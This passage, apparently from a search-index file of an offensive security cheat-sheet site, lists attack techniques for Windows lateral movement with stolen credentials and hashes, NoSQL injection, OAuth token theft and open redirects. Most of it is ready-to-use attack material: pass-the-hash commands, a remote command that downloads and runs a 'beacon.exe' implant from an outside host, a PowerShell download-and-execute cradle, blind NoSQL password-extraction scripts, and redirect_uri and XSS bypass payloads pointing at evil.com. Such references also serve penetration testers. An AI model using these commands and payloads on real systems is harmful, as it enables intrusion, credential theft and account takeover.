\":5858d47a41e40b40f294b3100bea611f\" -x 'whoami' # cmd root@payload$ cme smb 192.168.1.100 -u Administrator -H \":5858d47a41e40b40f294b3100bea611f\" -X 'whoami' # powershell root@payload$ cme smb 192.168.1.100 -u Administrator -H \":5858d47a41e40b40f294b3100bea611f\" --exec-method atexec -x 'whoami' root@payload$ cme smb 192.168.1.100 -u Administrator -H \":5858d47a41e40b40f294b3100bea611f\" --exec-method wmiexec -x 'whoami' root@payload$ cme smb 192.168.1.100 -u Administrator -H \":5858d47a41e40b40f294b3100bea611f\" --exec-method smbexec -x 'whoami'","title":"Crackmapexec"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#remote-code-execution-with-ps-credentials","text":"PS C:\\> $SecPassword = ConvertTo-SecureString 'secretpassword' -AsPlainText -Force PS C:\\> $Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\\USERNAME', $SecPassword) PS C:\\> Invoke-Command -ComputerName DC01 -Credential $Cred -ScriptBlock {whoami} PS C:\\> New-PSSESSION -NAME PSDC -ComputerName COMPUTER01; Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {whoami} PS C:\\> Invoke-Command -ComputerName COMPUTER01 -ScriptBlock {powershell Invoke-WebRequest -Uri 'http://10.10.10.10/beacon.exe' -OutFile 'C:\\Temp\\beacon.exe'; Start-Process -wait C:\\Temp\\beacon.exe}","title":"Remote Code Execution with PS Credentials"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#winrm","text":"Require: * Port 5985 or 5986 open. * Default endpoint is /wsman root@payload$ git clone https://github.com/Hackplayers/evil-winrm root@payload$ evil-winrm -i IP -u USER [-s SCRIPTS_PATH] [-e EXES_PATH] [-P PORT] [-p PASS] [-H HASH] [-U URL] [-S] [-c PUBLIC_KEY_PATH ] [-k PRIVATE_KEY_PATH ] [-r REALM] root@payload$ ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/' root@payload$ ruby evil-winrm.rb -i 10.0.0.20 -u username -H BD1C6503987F8FF006296118F359FA79 root@payload$ ruby evil-winrm.rb -i 10.0.0.20 -u username -p password -r domain.local *Evil-WinRM* PS > Bypass-4MSI *Evil-WinRM* PS > IEX([Net.Webclient]::new().DownloadString(\"http://127.0.0.1/PowerView.ps1\")) or using a custom ruby code to interact with the WinRM service. require 'winrm' conn = WinRM::Connection.new( endpoint: 'http://ip:5985/wsman', user: 'domain/user', password: 'password', ) command=\"\" conn.shell(:powershell) do |shell| until command == \"exit\\n\" do print \"PS > \" command = gets output = shell.run(command) do |stdout, stderr| STDOUT.print stdout STDERR.print stderr end end puts \"Exiting with code #{output.exitcode}\" end","title":"WinRM"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#powershell-remoting","text":"PSSESSION PS> Enable-PSRemoting # use credential PS> $pass = ConvertTo-SecureString 'supersecurepassword' -AsPlainText -Force PS> $cred = New-Object System.Management.Automation.PSCredential ('DOMAIN\\Username', $pass) PS> Invoke-Command -ComputerName DC -Credential $cred -ScriptBlock { whoami } # one-to-one interactive session PS> Enter-PSSession -computerName DC01 [DC01]: PS> # one-to-one execute scripts and commands PS> $Session = New-PSSession -ComputerName CLIENT1 PS> Invoke-Command -Session $Session -scriptBlock { $test = 1 } PS> Invoke-Command -Session $Session -scriptBlock { $test } 1 # one-to-many execute scripts and commands PS> Invoke-Command -computername DC01,CLIENT1 -scriptBlock { Get-Service } PS> Invoke-Command -computername DC01,CLIENT1 -filePath c:\\Scripts\\Task.ps1","title":"Powershell Remoting"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#winexe","text":"Integrated to Kali root@payload$ winexe -U DOMAIN/username%password //10.10.10.10 cmd.exe","title":"Winexe"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#wmi","text":"PS C:\\> wmic /node:target.domain /user:domain\\user /password:password process call create \"C:\\Windows\\System32\\calc.exe\u201d","title":"WMI"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#psexecpy-smbexecpy-wmiexecpy","text":"From Impacket (:warning: renamed to impacket-xxx in Kali) :warning: get / put for wmiexec, psexec, smbexec, and dcomexec are changing to lget and lput . :warning: French characters might not be correctly displayed on your output, use -codec ibm850 to fix this. root@payload$ git clone https://github.com/CoreSecurity/impacket.git # PSEXEC like functionality example using RemComSv root@payload$ python psexec.py DOMAIN/username:password@10.10.10.10 # this will drop a binary on the disk = noisy # A similar approach to PSEXEC w/o using RemComSvc root@payload$ python smbexec.py DOMAIN/username:password@10.10.10.10 # A semi-interactive shell, used through Windows Management Instrumentation. root@payload$ python wmiexec.py DOMAIN/username:password@10.10.10.10 root@payload$ wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79 # A semi-interactive shell similar to wmiexec.py, but using different DCOM endpoints. root@payload$ python atexec.py DOMAIN/username:password@10.10.10.10 # Executes a command on the target machine through the Task Scheduler service and returns the output of the executed command. root@payload$ python dcomexec.py DOMAIN/username:password@10.10.10.10","title":"Psexec.py / Smbexec.py / Wmiexec.py"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#psexec-sysinternal","text":"from Windows - Sysinternal PS C:\\> PsExec.exe \\\\ordws01.cscou.lab -u DOMAIN\\username -p password cmd.exe # switch admin user to NT Authority/System PS C:\\> PsExec.exe \\\\ordws01.cscou.lab -u DOMAIN\\username -p password cmd.exe -s","title":"PsExec - Sysinternal"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#rdp-remote-desktop-protocol","text":":warning: NOTE : You may need to enable RDP and disable NLA and fix CredSSP errors. # Enable RDP PS C:\\> reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f PS C:\\> netsh firewall set service remoteadmin enable PS C:\\> netsh firewall set service remotedesktop enable # Alternative C:\\> psexec \\\\machinename reg add \"hklm\\system\\currentcontrolset\\control\\terminal server\" /f /v fDenyTSConnections /t REG_DWORD /d 0 root@payload$ crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable # Fix CredSSP errors reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f # Disable NLA PS > (Get-WmiObject -class \"Win32_TSGeneralSetting\" -Namespace root\\cimv2\\terminalservices -ComputerName \"PC01\" -Filter \"TerminalName='RDP-tcp'\").UserAuthenticationRequired PS > (Get-WmiObject -class \"Win32_TSGeneralSetting\" -Namespace root\\cimv2\\terminalservices -ComputerName \"PC01\" -Filter \"TerminalName='RDP-tcp'\").SetUserAuthenticationRequired(0) Abuse RDP protocol to execute commands remotely with the following commands; rdesktop powershell root@payload$ rdesktop -d DOMAIN -u username -p password 10.10.10.10 -g 70 -r disk:share=/home/user/myshare root@payload$ rdesktop -u username -p password -g 70% -r disk:share=/tmp/myshare 10.10.10.10 # -g : the screen will take up 70% of your actual screen size # -r disk:share : sharing a local folder during a remote desktop session freerdp ```powershell root@payload$ xfreerdp /v:10.0.0.1 /u:'Username' /p:'Password123!' +clipboard /cert-ignore /size:1366x768 /smart-sizing root@payload$ xfreerdp /v:10.0.0.1 /u:username # password will be asked","title":"RDP Remote Desktop Protocol"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#pass-the-hash-using-restricted-admin-need-an-admin-account-not-in-the-remote-desktop-users-group","text":"","title":"pass the hash using Restricted Admin, need an admin account not in the \"Remote Desktop Users\" group."},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#pass-the-hash-works-for-server-2012-r2-win-81","text":"","title":"pass the hash works for Server 2012 R2 / Win 8.1+"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#require-freerdp2-x11-freerdp2-shadow-x11-packages-instead-of-freerdp-x11","text":"root@payload$ xfreerdp /v:10.0.0.1 /u:username /d:domain /pth:88a405e17c0aa5debbc9b5679753939d * [SharpRDP](https://github.com/0xthirteen/SharpRDP) powershell PS C:> SharpRDP.exe computername=target.domain command=\"C:\\Temp\\file.exe\" username=domain\\user password=password ```","title":"require freerdp2-x11 freerdp2-shadow-x11 packages instead of freerdp-x11"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#netuse","text":"Windows only PS C:\\> net use \\\\ordws01.cscou.lab /user:DOMAIN\\username password C$","title":"Netuse"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#runas","text":"PS C:\\> runas /netonly /user:DOMAIN\\username \"cmd.exe\" PS C:\\> runas /noprofil /netonly /user:DOMAIN\\username cmd.exe","title":"Runas"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#pass-the-ticket","text":"python3 getTGT.py -hashes aad3b435b51404eeaad3b435b51404ee:B65039D1C0359FA797F88FF06296118F domain.local/user [*] Saving ticket in user.ccache cp user.ccache /tmp/krb5cc_0 export KRB5CCNAME=/tmp/krb5cc_0 klist","title":"Pass the Ticket"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#ssh","text":":warning: You cannot pass the hash to SSH, but you can connect with a Kerberos ticket (Which you can get by passing the hash!) cp user.ccache /tmp/krb5cc_1045 ssh -o GSSAPIAuthentication=yes user@domain.local -vv","title":"SSH"},{"location":"Methodology%20and%20Resources/Windows%20-%20Using%20credentials/#references","text":"Ropnop - Using credentials to own Windows boxes Ropnop - Using credentials to own Windows boxes Part 2 Gaining Domain Admin from Outside Active Directory","title":"References"},{"location":"NoSQL%20Injection/","text":"NoSQL injection NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax. Summary Tools Exploit Authentication Bypass Extract length information Extract data information Blind NoSQL POST with JSON body GET MongoDB Payloads References Tools NoSQLmap - Automated NoSQL database enumeration and web application exploitation tool nosqlilab - A lab for playing with NoSQL Injection Exploit Authentication Bypass Basic authentication bypass using not equal ($ne) or greater ($gt) in DATA username[$ne]=toto&password[$ne]=toto login[$regex]=a.*&pass[$ne]=lol login[$gt]=admin&login[$lt]=test&pass[$ne]=1 login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto in JSON {\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}} {\"username\": {\"$ne\": \"foo\"}, \"password\": {\"$ne\": \"bar\"}} {\"username\": {\"$gt\": undefined}, \"password\": {\"$gt\": undefined}} {\"username\": {\"$gt\":\"\"}, \"password\": {\"$gt\":\"\"}} Extract length information username[$ne]=toto&password[$regex]=.{1} username[$ne]=toto&password[$regex]=.{3} Extract data information in URL username[$ne]=toto&password[$regex]=m.{2} username[$ne]=toto&password[$regex]=md.{1} username[$ne]=toto&password[$regex]=mdp username[$ne]=toto&password[$regex]=m.* username[$ne]=toto&password[$regex]=md.* in JSON {\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \"^m\" }} {\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \"^md\" }} {\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \"^mdp\" }} Extract data with \"in\" {\"username\":{\"$in\":[\"Admin\", \"4dm1n\", \"admin\", \"root\", \"administrator\"]},\"password\":{\"$gt\":\"\"}} Blind NoSQL POST with JSON body import requests import urllib3 import string import urllib urllib3.disable_warnings() username=\"admin\" password=\"\" u=\"http://example.org/login\" headers={'content-type': 'application/json'} while True: for c in string.printable: if c not in ['*','+','.','?','|']: payload='{\"username\": {\"$eq\": \"%s\"}, \"password\": {\"$regex\": \"^%s\" }}' % (username, password + c) r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False) if 'OK' in r.text or r.status_code == 302: print(\"Found one more char : %s\" % (password+c)) password += c POST with urlencoded body import requests import urllib3 import string import urllib urllib3.disable_warnings() username=\"admin\" password=\"\" u=\"http://example.org/login\" headers={'content-type': 'application/x-www-form-urlencoded'} while True: for c in string.printable: if c not in ['*','+','.','?','|','&','$']: payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c) r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False) if r.status_code == 302 and r.headers['Location'] == '/dashboard': print(\"Found one more char : %s\" % (password+c)) password += c GET import requests import urllib3 import string import urllib urllib3.disable_warnings() username='admin' password='' u='http://example.org/login' while True: for c in string.printable: if c not in ['*','+','.','?','|', '#', '&', '$']: payload='?username=%s&password[$regex]=^%s' % (username, password + c) r = requests.get(u + payload) if 'Yeah' in r.text: print(\"Found one more char : %s\" % (password+c)) password += c MongoDB Payloads true, $where: '1 == 1' , $where: '1 == 1' $where: '1 == 1' ', $where: '1 == 1' 1, $where: '1 == 1' { $ne: 1 } ', $or: [ {}, { 'a':'a ' } ], $comment:'successful MongoDB injection' db.injection.insert({success:1}); db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1 || 1==1 ' && this.password.match(/.*/)//+%00 ' && this.passwordzz.match(/.*/)//+%00 '%20%26%26%20this.password.match(/.*/)//+%00 '%20%26%26%20this.passwordzz.match(/.*/)//+%00 {$gt: ''} [$ne]=1 References Les NOSQL injections Classique et Blind: Never trust user input - Geluchat Testing for NoSQL injection - OWASP/WSTG NoSQL injection wordlists - cr0hn NoSQL Injection in MongoDB - JUL 17, 2016 - Zanon","title":"NoSQL injection"},{"location":"NoSQL%20Injection/#nosql-injection","text":"NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.","title":"NoSQL injection"},{"location":"NoSQL%20Injection/#summary","text":"Tools Exploit Authentication Bypass Extract length information Extract data information Blind NoSQL POST with JSON body GET MongoDB Payloads References","title":"Summary"},{"location":"NoSQL%20Injection/#tools","text":"NoSQLmap - Automated NoSQL database enumeration and web application exploitation tool nosqlilab - A lab for playing with NoSQL Injection","title":"Tools"},{"location":"NoSQL%20Injection/#exploit","text":"","title":"Exploit"},{"location":"NoSQL%20Injection/#authentication-bypass","text":"Basic authentication bypass using not equal ($ne) or greater ($gt) in DATA username[$ne]=toto&password[$ne]=toto login[$regex]=a.*&pass[$ne]=lol login[$gt]=admin&login[$lt]=test&pass[$ne]=1 login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto in JSON {\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}} {\"username\": {\"$ne\": \"foo\"}, \"password\": {\"$ne\": \"bar\"}} {\"username\": {\"$gt\": undefined}, \"password\": {\"$gt\": undefined}} {\"username\": {\"$gt\":\"\"}, \"password\": {\"$gt\":\"\"}}","title":"Authentication Bypass"},{"location":"NoSQL%20Injection/#extract-length-information","text":"username[$ne]=toto&password[$regex]=.{1} username[$ne]=toto&password[$regex]=.{3}","title":"Extract length information"},{"location":"NoSQL%20Injection/#extract-data-information","text":"in URL username[$ne]=toto&password[$regex]=m.{2} username[$ne]=toto&password[$regex]=md.{1} username[$ne]=toto&password[$regex]=mdp username[$ne]=toto&password[$regex]=m.* username[$ne]=toto&password[$regex]=md.* in JSON {\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \"^m\" }} {\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \"^md\" }} {\"username\": {\"$eq\": \"admin\"}, \"password\": {\"$regex\": \"^mdp\" }} Extract data with \"in\" {\"username\":{\"$in\":[\"Admin\", \"4dm1n\", \"admin\", \"root\", \"administrator\"]},\"password\":{\"$gt\":\"\"}}","title":"Extract data information"},{"location":"NoSQL%20Injection/#blind-nosql","text":"","title":"Blind NoSQL"},{"location":"NoSQL%20Injection/#post-with-json-body","text":"import requests import urllib3 import string import urllib urllib3.disable_warnings() username=\"admin\" password=\"\" u=\"http://example.org/login\" headers={'content-type': 'application/json'} while True: for c in string.printable: if c not in ['*','+','.','?','|']: payload='{\"username\": {\"$eq\": \"%s\"}, \"password\": {\"$regex\": \"^%s\" }}' % (username, password + c) r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False) if 'OK' in r.text or r.status_code == 302: print(\"Found one more char : %s\" % (password+c)) password += c","title":"POST with JSON body"},{"location":"NoSQL%20Injection/#post-with-urlencoded-body","text":"import requests import urllib3 import string import urllib urllib3.disable_warnings() username=\"admin\" password=\"\" u=\"http://example.org/login\" headers={'content-type': 'application/x-www-form-urlencoded'} while True: for c in string.printable: if c not in ['*','+','.','?','|','&','$']: payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c) r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False) if r.status_code == 302 and r.headers['Location'] == '/dashboard': print(\"Found one more char : %s\" % (password+c)) password += c","title":"POST with urlencoded body"},{"location":"NoSQL%20Injection/#get","text":"import requests import urllib3 import string import urllib urllib3.disable_warnings() username='admin' password='' u='http://example.org/login' while True: for c in string.printable: if c not in ['*','+','.','?','|', '#', '&', '$']: payload='?username=%s&password[$regex]=^%s' % (username, password + c) r = requests.get(u + payload) if 'Yeah' in r.text: print(\"Found one more char : %s\" % (password+c)) password += c","title":"GET"},{"location":"NoSQL%20Injection/#mongodb-payloads","text":"true, $where: '1 == 1' , $where: '1 == 1' $where: '1 == 1' ', $where: '1 == 1' 1, $where: '1 == 1' { $ne: 1 } ', $or: [ {}, { 'a':'a ' } ], $comment:'successful MongoDB injection' db.injection.insert({success:1}); db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1 || 1==1 ' && this.password.match(/.*/)//+%00 ' && this.passwordzz.match(/.*/)//+%00 '%20%26%26%20this.password.match(/.*/)//+%00 '%20%26%26%20this.passwordzz.match(/.*/)//+%00 {$gt: ''} [$ne]=1","title":"MongoDB Payloads"},{"location":"NoSQL%20Injection/#references","text":"Les NOSQL injections Classique et Blind: Never trust user input - Geluchat Testing for NoSQL injection - OWASP/WSTG NoSQL injection wordlists - cr0hn NoSQL Injection in MongoDB - JUL 17, 2016 - Zanon","title":"References"},{"location":"OAuth/","text":"OAuth Summary Stealing OAuth Token via referer Grabbing OAuth Token via redirect_uri Executing XSS via redirect_uri OAuth private key disclosure Authorization Code Rule Violation Cross-Site Request Forgery References Stealing OAuth Token via referer From @abugzlife1 tweet. Do you have HTML injection but can't get XSS? Are there any OAuth implementations on the site? If so, setup an img tag to your server and see if there's a way to get the victim there (redirect, etc.) after login to steal OAuth tokens via referer Grabbing OAuth Token via redirect_uri Redirect to a controlled domain to get the access token https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com Redirect to an accepted Open URL in to get the access token https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F OAuth implementations should never whitelist entire domains, only a few URLs so that \u201credirect_uri\u201d can\u2019t be pointed to an Open Redirect. Sometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri: https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com Executing XSS via redirect_uri https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script> OAuth private key disclosure Some Android/iOS app can be decompiled and the OAuth Private key can be accessed. Authorization Code Rule Violation The client MUST NOT use the authorization code more than once. If an authorization code is used more than once, the authorization server MUST deny the request and SHOULD revoke (when possible) all tokens previously issued based on that authorization code. Cross-Site Request Forgery Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable. This can be exploited by initializing the OAuth flow and intercepting the callback ( https://example.com/callback?code=AUTHORIZATION_CODE ). This URL can be used in CSRF attacks. The client MUST implement CSRF protection for its redirection URI. This is typically accomplished by requiring any request sent to the redirection URI endpoint to include a value that binds the request to the user-agent's authenticated state. The client SHOULD utilize the \"state\" request parameter to deliver this value to the authorization server when making an authorization request. References All your Paypal OAuth tokens belong to me - localhost for the win - INTO THE SYMMETRY OAuth 2 - How I have hacked Facebook again (..and would have stolen a valid access token) - INTO THE SYMMETRY How I hacked Github again. - Egor Homakov How Microsoft is giving your data to Facebook\u2026 and everyone else - Andris Atteka Bypassing Google Authentication on Periscope's Administration Panel By Jack Whitton","title":"OAuth"},{"location":"OAuth/#oauth","text":"","title":"OAuth"},{"location":"OAuth/#summary","text":"Stealing OAuth Token via referer Grabbing OAuth Token via redirect_uri Executing XSS via redirect_uri OAuth private key disclosure Authorization Code Rule Violation Cross-Site Request Forgery References","title":"Summary"},{"location":"OAuth/#stealing-oauth-token-via-referer","text":"From @abugzlife1 tweet. Do you have HTML injection but can't get XSS? Are there any OAuth implementations on the site? If so, setup an img tag to your server and see if there's a way to get the victim there (redirect, etc.) after login to steal OAuth tokens via referer","title":"Stealing OAuth Token via referer"},{"location":"OAuth/#grabbing-oauth-token-via-redirect_uri","text":"Redirect to a controlled domain to get the access token https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com Redirect to an accepted Open URL in to get the access token https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F OAuth implementations should never whitelist entire domains, only a few URLs so that \u201credirect_uri\u201d can\u2019t be pointed to an Open Redirect. Sometimes you need to change the scope to an invalid one to bypass a filter on redirect_uri: https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com","title":"Grabbing OAuth Token via redirect_uri"},{"location":"OAuth/#executing-xss-via-redirect_uri","text":"https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>","title":"Executing XSS via redirect_uri"},{"location":"OAuth/#oauth-private-key-disclosure","text":"Some Android/iOS app can be decompiled and the OAuth Private key can be accessed.","title":"OAuth private key disclosure"},{"location":"OAuth/#authorization-code-rule-violation","text":"The client MUST NOT use the authorization code more than once. If an authorization code is used more than once, the authorization server MUST deny the request and SHOULD revoke (when possible) all tokens previously issued based on that authorization code.","title":"Authorization Code Rule Violation"},{"location":"OAuth/#cross-site-request-forgery","text":"Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable. This can be exploited by initializing the OAuth flow and intercepting the callback ( https://example.com/callback?code=AUTHORIZATION_CODE ). This URL can be used in CSRF attacks. The client MUST implement CSRF protection for its redirection URI. This is typically accomplished by requiring any request sent to the redirection URI endpoint to include a value that binds the request to the user-agent's authenticated state. The client SHOULD utilize the \"state\" request parameter to deliver this value to the authorization server when making an authorization request.","title":"Cross-Site Request Forgery"},{"location":"OAuth/#references","text":"All your Paypal OAuth tokens belong to me - localhost for the win - INTO THE SYMMETRY OAuth 2 - How I have hacked Facebook again (..and would have stolen a valid access token) - INTO THE SYMMETRY How I hacked Github again. - Egor Homakov How Microsoft is giving your data to Facebook\u2026 and everyone else - Andris Atteka Bypassing Google Authentication on Periscope's Administration Panel By Jack Whitton","title":"References"},{"location":"Open%20Redirect/","text":"Open URL Redirection Un-validated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Un-validated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application\u2019s access control check and then forward the attacker to privileged functions that they would normally not be able to access. Summary Open URL Redirection Summary Exploitation HTTP Redirection Status Code - 3xx Fuzzing Filter Bypass Common injection parameters References Exploitation Let\u2019s say there\u2019s a well known website - https://famous-website.tld/. And let's assume that there's a link like : https://famous-website.tld/signup?redirectUrl=https://famous-website.tld/account After signing up you get redirected to your account, this redirection is specified by the redirectUrl parameter in the URL. What happens if we change the famous-website.tld/account to evil-website.tld ? https://famous-website.tld/signup?redirectUrl=https://evil-website.tld/account By visiting this url, if we get redirected to evil-website.tld after the sign-up, we have an Open Redirect vulnerability. This can be abused by an attacker to display a phishing page asking you to enter your credentials. HTTP Redirection Status Code - 3xx 300 Multiple Choices 301 Moved Permanently 302 Found 303 See Other 304 Not Modified 305 Use Proxy 307 Temporary Redirect 308 Permanent Redirect Fuzzing Replace www.whitelisteddomain.tld from Open-Redirect-payloads.txt with a specific white listed domain in your test case To do this simply modify the WHITELISTEDDOMAIN with value www.test.com to your test case URL. WHITELISTEDDOMAIN=\"www.test.com\" && sed 's/www.whitelisteddomain.tld/'\"$WHITELISTEDDOMAIN\"'/' Open-Redirect-payloads.txt > Open-Redirect-payloads-burp-\"$WHITELISTEDDOMAIN\".txt && echo \"$WHITELISTEDDOMAIN\" | awk -F. '{print \"https://\"$0\".\"$NF}' >> Open-Redirect-payloads-burp-\"$WHITELISTEDDOMAIN\".txt Filter Bypass Using a whitelisted domain or keyword www.whitelisted.com.evil.com redirect to evil.com Using CRLF to bypass \"javascript\" blacklisted keyword java%0d%0ascript%0d%0a:alert(0) Using \"//\" & \"////\" to bypass \"http\" blacklisted keyword //google.com ////google.com Using \"https:\" to bypass \"//\" blacklisted keyword https:google.com Using \"\\/\\/\" to bypass \"//\" blacklisted keyword (Browsers see \\/\\/ as //) \\/\\/google.com/ /\\/google.com/ Using \"%E3%80%82\" to bypass \".\" blacklisted character /?redir=google\u3002com //google%E3%80%82com Using null byte \"%00\" to bypass blacklist filter //google%00.com Using parameter pollution ?next=whitelisted.com&next=google.com Using \"@\" character, browser will redirect to anything after the \"@\" http://www.theirsite.com@yoursite.com/ Creating folder as their domain http://www.yoursite.com/http://www.theirsite.com/ http://www.yoursite.com/folder/www.folder.com Using \"?\" characted, browser will translate it to \"/?\" http://www.yoursite.com?http://www.theirsite.com/ http://www.yoursite.com?folder/www.folder.com Host/Split Unicode Normalization https://evil.c\u2100.example.com . ---> https://evil.ca/c.example.com http://a.com\uff0fX.b.com XSS from Open URL - If it's in a JS variable \";alert(0);// XSS from data:// wrapper http://www.example.com/redirect.php?url=data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+Cg== XSS from javascript:// wrapper http://www.example.com/redirect.php?url=javascript:prompt(1) Common injection parameters /{payload} ?next={payload} ?url={payload} ?target={payload} ?rurl={payload} ?dest={payload} ?destination={payload} ?redir={payload} ?redirect_uri={payload} ?redirect_url={payload} ?redirect={payload} /redirect/{payload} /cgi-bin/redirect.cgi?{payload} /out/{payload} /out?{payload} ?view={payload} /login?to={payload} ?image_url={payload} ?go={payload} ?return={payload} ?returnTo={payload} ?return_to={payload} ?checkout_url={payload} ?continue={payload} ?return_path={payload} References filedescriptor You do not need to run 80 reconnaissance tools to get access to user accounts - @stefanocoding OWASP - Unvalidated Redirects and Forwards Cheat Sheet Cujanovic - Open-Redirect-Payloads Pentester Land - Open Redirect Cheat Sheet Open Redirect Vulnerability - AUGUST 15, 2018 - s0cket7 Host/Split Exploitable Antipatterns in Unicode Normalization - BlackHat US 2019","title":"Open URL Redirection"},{"location":"Open%20Redirect/#open-url-redirection","text":"Un-validated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance. Un-validated redirect and forward attacks can also be used to maliciously craft a URL that would pass the application\u2019s access control check and then forward the attacker to privileged functions that they would normally not be able to access.","title":"Open URL Redirection"},{"location":"Open%20Redirect/#summary","text":"Open URL Redirection Summary Exploitation HTTP Redirection Status Code - 3xx Fuzzing Filter Bypass Common injection parameters References","title":"Summary"},{"location":"Open%20Redirect/#exploitation","text":"Let\u2019s say there\u2019s a well known website - https://famous-website.tld/. And let's assume that there's a link like : https://famous-website.tld/signup?redirectUrl=https://famous-website.tld/account After signing up you get redirected to your account, this redirection is specified by the redirectUrl parameter in the URL. What happens if we change the famous-website.tld/account to evil-website.tld ? https://famous-website.tld/signup?redirectUrl=https://evil-website.tld/account By visiting this url, if we get redirected to evil-website.tld after the sign-up, we have an Open Redirect vulnerability. This can be abused by an attacker to display a phishing page asking you to enter your credentials.","title":"Exploitation"},{"location":"Open%20Redirect/#http-redirection-status-code-3xx","text":"300 Multiple Choices 301 Moved Permanently 302 Found 303 See Other 304 Not Modified 305 Use Proxy 307 Temporary Redirect 308 Permanent Redirect","title":"HTTP Redirection Status Code - 3xx"},{"location":"Open%20Redirect/#fuzzing","text":"Replace www.whitelisteddomain.tld from Open-Redirect-payloads.txt with a specific white listed domain in your test case To do this simply modify the WHITELISTEDDOMAIN with value www.test.com to your test case URL. WHITELISTEDDOMAIN=\"www.test.com\" && sed 's/www.whitelisteddomain.tld/'\"$WHITELISTEDDOMAIN\"'/' Open-Redirect-payloads.txt > Open-Redirect-payloads-burp-\"$WHITELISTEDDOMAIN\".txt && echo \"$WHITELISTEDDOMAIN\" | awk -F. '{print \"https://\"$0\".\"$NF}' >> Open-Redirect-payloads-burp-\"$WHITELISTEDDOMAIN\".txt","title":"Fuzzing"},{"location":"Open%20Redirect/#filter-bypass","text":"Using a whitelisted domain or keyword 